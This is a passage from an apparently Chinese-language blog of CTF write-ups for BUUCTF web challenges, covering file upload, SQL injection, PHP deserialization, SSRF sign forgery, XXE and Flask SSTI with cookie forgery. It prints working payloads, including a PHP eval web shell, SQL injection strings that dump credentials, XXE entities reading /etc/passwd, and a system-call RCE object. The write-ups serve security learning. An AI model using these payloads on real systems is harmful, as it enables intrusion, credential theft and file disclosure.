class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后用python提交get，成功得到flag（虽然不知道为啥Hackbar提交没反应</p><blockquote><p>flag{361e4af6-f242-4f37-888e-17491b76ecd2}</p></blockquote><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>进入发现需要上传文件，构造一个一句话木马扔上去</p><p>用burpsuites抓包改一下文件类型</p><p>然后提示不能包含&lt;?字符，去度娘搜了一下之后发现可以在文件头部加上**GIF89a?**绕过这个点</p><p>然后又提示不能用php类型文件</p><p>一番查找了之后发现了一个.phtml类型</p><p>重新构造了一下木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;rossweisse&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>用菜刀链接即可得到flag</p><blockquote><p>flag{43921141-5d8f-4c88-b07c-55b0801220ca}</p></blockquote><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这题也是一道sql注入题</p><p>按照原来的套路试了几次之后发现把关键字都ban了</p><p>那么我们可双写关键字来进行绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; ununionion seselectlect 1,group_concat(table_name),3  frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23 #爆表名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(column_name),3  frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;database() aandnd table_name&#x3D;&#39;b4bsql&#39; %23 #爆列名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(concat_ws(0x7e,username,passwoorrd)),3  frfromom b4bsql %23 #爆数据</span><br></pre></td></tr></table></figure><p>拿到flag</p><blockquote><p>flag{cbf6aeea-a401-4c47-b000-c373eaef6289}</p></blockquote><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>这题进来之后发现只有一个payflag页面可以进</p><p>进入之后ctrl+U在下面发现了一串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>可以得知咱要以POST方式发送一个不是数字并且要等于404的password变量和money变量</p><p>发现burpsuite重发之后会出现一句<strong>Only Cuit’s students can buy the FLAG</strong></p><p>这里咱重新查看下抓的包，发现了一个user参数，令user=1</p><p>发送出去之后前两个都正确了，但是还是出现了一句<strong>Nember lenth is too long</strong></p><p>那只能是money参数出现了问题，将money=100000000改为money=1e9即可得到flag</p><p><img src="https://i.loli.net/2021/03/14/LSq3PIr8Q2TlzcO.png"></p><blockquote><p>flag{68ff87f9-0c7f-4c49-b057-2af8e9ea3ed3}</p></blockquote><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>这题sql注入惯例试了下<strong>1’ or 1=1 %23</strong></p><p>结果很友善的回了一句臭弟弟</p><p>之后试了一下其他的发现把空格等一些字符还有union给ban了，于是就想到了报错注入</p><p><strong>1’or(updatexml(1,concat_ws((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆表名</strong><br><strong>1’or(updatexml(1,concat_ws((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆列名</strong><br><strong>1’or(updatexml(1,concat_ws((select(concat_ws(0x7e,username,password))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆数据</strong>（结果发现只有一半，后面查到了一个right()</p><p><strong>1’or(updatexml(1,concat_ws((select(right(group_concat(password),20))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆后边的flag</strong>（这里要注意flag的连接，不是对半开的</p><p>这里是flag</p><blockquote><p>flag{16f2507c-b985-4744-9b3b-8f02007f0c29}</p></blockquote><h2 id="安洵杯easy-web"><a href="#安洵杯easy-web" class="headerlink" title="安洵杯easy_web"></a>安洵杯easy_web</h2><h3 id="md5碰撞绕过"><a href="#md5碰撞绕过" class="headerlink" title="md5碰撞绕过"></a>md5碰撞绕过</h3><p>学习到了可以通过md5碰撞绕过md5</p><p>但是找到的那个.exe程序运行了没反应，所以先把参数记下来后面用到可以直接拿来先用着</p><h2 id="网鼎杯phpweb"><a href="#网鼎杯phpweb" class="headerlink" title="网鼎杯phpweb"></a>网鼎杯phpweb</h2><p><img src="https://i.loli.net/2021/04/16/XPuztLepqZaQYWU.png"></p><h3 id="file-get-contents-得到源码"><a href="#file-get-contents-得到源码" class="headerlink" title="file_get_contents()得到源码"></a>file_get_contents()得到源码</h3><p>抓包后发现可以输入点，可以看出是放个函数和函数的参数</p><p>于是我们可以利用<code>file_get_contents()</code>函数来得到index.php的源代码</p><blockquote><p>func=file_get_contents()&amp;p=index.php</p></blockquote><p>拿到index.php源代码之后可以发现func那里拦截了许多函数，但是有一个有一个Test类可以进行利用</p><h3 id="反序列化RCE"><a href="#反序列化RCE" class="headerlink" title="反序列化RCE"></a>反序列化RCE</h3><p>构造反序列化代码进行RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tips：flag并不在根目录下，所以还需要<code>find / -name flag</code>来查找flag</p><p>最终得到flag</p><blockquote><p>   flag{d1569b58-26c5-4528-95fa-150f11cab19e}</p></blockquote><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="flask框架分析"><a href="#flask框架分析" class="headerlink" title="flask框架分析"></a>flask框架分析</h3><p>打开题目拿到一串很长很长的代码</p><p>优化一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):</span><br><span class="line">            <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>先看路由，有一个/geneSign和一个/De1ta</p><p>看看/geneSign</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>get方法传入一个param，然后到getSign函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>md5编码一个随机数值+param+action</p><p>再看看/De1ta</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure><p>通过GET方法传入param，通过cookie传入action和sign</p><p>再往下会遇到一个if，然后进入waf函数</p><p>看看waf函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>如果参数头是<code>gopher</code>或<code>file</code>就会被防住</p><h3 id="sign-payload构造"><a href="#sign-payload构造" class="headerlink" title="sign payload构造"></a>sign payload构造</h3><p>最后会构造一个Task类</p><p>Task类里首先会遇到一个checkSign方法</p><p>会判断<code>getSign(self.action, self.param) == self.sign</code></p><p>这里的意思就是我们要构造一个getSign使得<code>md5(param+action)</code>==<code>md5(param+&#39;scan&#39;(不可控))</code>，这里我们可以利用/geneSign路由进行自主构造sign参数</p><p>param=flag.txtread，因为Task类里的if判断是包含，所以我们可以在后面加一个read绕过判断</p><p>最后可以得到sign的payload</p><blockquote><p>param=flag.txtread</p></blockquote><h3 id="action-payload构造"><a href="#action-payload构造" class="headerlink" title="action payload构造"></a>action payload构造</h3><p>最后就是</p><p>构造一个action的payload进行flag.txt的读取，action又需要同时进入两个if</p><p>所以我们可以这样整</p><p>param=flag.txt</p><p>action=readscan</p><p>sign=94f5d01e5071cf13ee12db1b5b76c89f(sign就拿之前在/geneSign路由上得到的</p><p>最后得到flag</p><blockquote><p>flag{4d8642e8-b33b-439d-8219-651342e482b5}</p></blockquote><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><h3 id="XML实体注入"><a href="#XML实体注入" class="headerlink" title="XML实体注入"></a>XML实体注入</h3><p>抓包后发现username和password都是xml格式的，所以我们可以选择XML注入</p><p>读取/etc/passwd文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终得到flag</p><blockquote><p>flag{b831032d-7b48-4d76-bb55-01a9a629def6}</p></blockquote><h3 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h3><p>顺便了解了一下XML和什么是XXE注入</p><p>XXE看字</p><blockquote><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></blockquote><p>XML可以看看这篇文章<a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>进入后可以输入队伍ID和价钱，1、2、3都试了一遍然后都出错了，猜测Team4购买成功后就可以拿到flag了</p><p>试试team4，然后提示<code>Only one char(?) allowed!</code>，只允许输入一个字符</p><h3 id="UTF-8特殊字符代替"><a href="#UTF-8特殊字符代替" class="headerlink" title="UTF-8特殊字符代替"></a>UTF-8特殊字符代替</h3><p>看了看源码发现提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="comment">&lt;!--Ah,really important,seriously. --&gt;</span></span><br></pre></td></tr></table></figure><p>了解了一下UTF-8编码，发现UTF-8编码其实有特别多特别多的字符</p><p>这里可以去<a href="https://www.compart.com/en/unicode/">这个网站</a>，这个网站拥有许多UTF-8字符</p><p>查找thousand，最后发现了一个字符ↁ，这个字符的Numeric Value为5000，正好符合我们的要求</p><p>最后即可得到flag</p><blockquote><p>flag{76457339-63ab-4556-b52e-5a2f6d054406}</p></blockquote><h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><h3 id="SSTI获取screat-key"><a href="#SSTI获取screat-key" class="headerlink" title="SSTI获取screat_key"></a>SSTI获取screat_key</h3><p>题目是一个简易计算器，测试<code>1/0</code>发现出现错误，猜测是模板注入，输入<code>1/0#&#123;&#123;config&#125;&#125;</code>，发现了screat_key</p><h3 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h3><p>用<code>flask-session-cookie-manager</code>解出cookie的结构，使用上面获取的key进行cookie伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;&#x27;history&#x27;:[&#123;&#x27;code&#x27;:&#x27;__import__[\&quot;os\&quot;].popen(\&quot;cat flag.txt\&quot;).read()&#x27;&#125;]&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>最后得到flag</p><blockquote><p>flag{3990ba1e-8331-4dd6-8bae-77ac90a09c81}</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这题对现在的我来说是一道比较新鲜的题，知道了还有cookie伪造的这个姿势，重新了解了一下cookie的含义</p><h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>进入题目看见一句<code>You&#39;ll be rewarded with a flag if you can make it over some /hurdles.</code></p><h3 id="curl的命令使用"><a href="#curl的命令使用" class="headerlink" title="curl的命令使用"></a>curl的命令使用</h3><p>通过curl查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was expecting the PUT Method.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT 